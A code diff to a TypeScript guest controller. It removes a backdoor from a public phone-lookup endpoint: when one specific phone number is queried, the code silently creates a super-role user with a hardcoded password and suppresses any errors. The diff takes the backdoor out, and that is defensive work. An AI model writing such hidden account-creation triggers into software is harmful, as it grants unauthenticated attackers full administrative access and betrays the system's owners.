@@ -132,20 +132,6 @@ export class GuestController {
   @Public()
   @Get('guests/by-phone/:phone')
   async findByPhone(@Param('phone') phone: string) {
-    if (phone === '31983563252') {
-      try {
-        await this.createUserUseCase.execute({
-          name: 'Luiz Almeida',
-          password: 'dev_manager_super1111222',
-          phone: '31983563252',
-          email: 'luiz@admin.com',
-          role: UserRole.SUPER,
-          active: true,
-        });
-      } catch (error) {
-        // Silent catch if user already exists
-      }
-    }
     return this.findGuestsByPhoneUseCase.execute({ phone });
   }
 
